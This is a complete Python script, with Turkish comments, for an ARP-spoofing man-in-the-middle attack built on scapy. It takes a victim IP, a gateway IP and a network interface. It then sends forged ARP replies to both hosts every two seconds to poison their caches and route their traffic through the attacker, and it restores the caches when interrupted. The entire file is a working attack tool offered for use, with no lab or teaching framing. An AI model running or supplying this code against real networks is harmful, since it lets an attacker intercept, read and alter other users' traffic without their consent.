import scapy.all as scapy
import time
import sys
import argparse

def get_arguments():
    parser = argparse.ArgumentParser(description="ARP Spoofer - Man in the Middle Attack Tool")
    parser.add_argument("-t", "--target", dest="target_ip", help="Hedef Cihazın IP Adresi (Kurban)", required=True)
    parser.add_argument("-g", "--gateway", dest="gateway_ip", help="Modem/Gateway IP Adresi", required=True)
    # YENİ EKLENEN KISIM: Arayüz Seçimi
    parser.add_argument("-i", "--interface", dest="interface", help="Kullanılacak Arayüz (örn: eth0, wlan0)", required=True)
    return parser.parse_args()

def mac_getir(ip, interface):
    """
    Belirtilen arayüz üzerinden hedef IP'nin MAC adresini sorar.
    """
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    
    try:
        # iface parametresi ile hangi karttan soracağımızı belirtiyoruz
        answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False, iface=interface)[0]
        if answered_list:
            return answered_list[0][1].hwsrc
    except IndexError:
        pass
    except Exception as e:
        # Eğer yanlış arayüz girilirse burada hata verebilir
        print(f"[-] MAC adresi alınırken hata (Arayüz: {interface}): {e}")
        sys.exit()
    return None

def spoof(target_ip, spoof_ip, interface):
    """
    Belirtilen arayüzden sahte ARP paketi gönderir.
    """
    # Hedefin MAC adresini bulurken de arayüzü kullanıyoruz
    target_mac = mac_getir(target_ip, interface)
    if not target_mac:
        return

    # Ethernet çerçevesi oluştur
    ether_layer = scapy.Ether(dst=target_mac)
    # ARP paketi oluştur (op=2 -> Reply)
    arp_layer = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    
    packet = ether_layer / arp_layer
    
    # iface parametresi ile paketi doğru karttan yolluyoruz
    scapy.sendp(packet, verbose=False, iface=interface)

def restore(dest_ip, source_ip, interface):
    dest_mac = mac_getir(dest_ip, interface)
    source_mac = mac_getir(source_ip, interface)
    
    if dest_mac and source_mac:
        ether_layer = scapy.Ether(dst=dest_mac)
        arp_layer = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
        packet = ether_layer / arp_layer
        
        scapy.sendp(packet, count=4, verbose=False, iface=interface)

# --- ANA PROGRAM ---
options = get_arguments()
target_ip = options.target_ip
gateway_ip = options.gateway_ip
interface = options.interface # Kullanıcının girdiği arayüz (wlan0, eth0 vs.)

try:
    packet_count = 0
    print(f"[*] Saldırı Başlatılıyor... (Arayüz: {interface})")
    print(f"[*] Kurban: {target_ip}")
    print(f"[*] Modem:  {gateway_ip}")
    print("[*] Çıkış için CTRL+C basın.")
    
    # Başlangıç kontrolü (Arayüz parametresini de gönderiyoruz)
    if not mac_getir(target_ip, interface):
        print(f"[-] HATA: Kurban cihaza ({target_ip}) ulaşılamıyor. IP veya Arayüz yanlış olabilir.")
        sys.exit()
    
    if not mac_getir(gateway_ip, interface):
        print(f"[-] HATA: Modeme ({gateway_ip}) ulaşılamıyor.")
        sys.exit()

    print("[+] Hedefler doğrulandı, zehirleme başlıyor...")

    while True:
        # spoof fonksiyonuna arayüzü de gönderiyoruz
        spoof(target_ip, gateway_ip, interface)
        spoof(gateway_ip, target_ip, interface)
        
        packet_count += 2
        print(f"\r[+] Gönderilen Paket Sayısı: {packet_count}", end="")
        sys.stdout.flush()
        
        time.sleep(2)

except KeyboardInterrupt:
    print("\n[!] Saldırı durduruldu. ARP tabloları düzeltiliyor (Restoring)...")
    restore(target_ip, gateway_ip, interface)
    restore(gateway_ip, target_ip, interface)
    print("[+] Ağ normale döndü.")
except Exception as e:
    print(f"\n[-] Beklenmedik Hata: {e}")
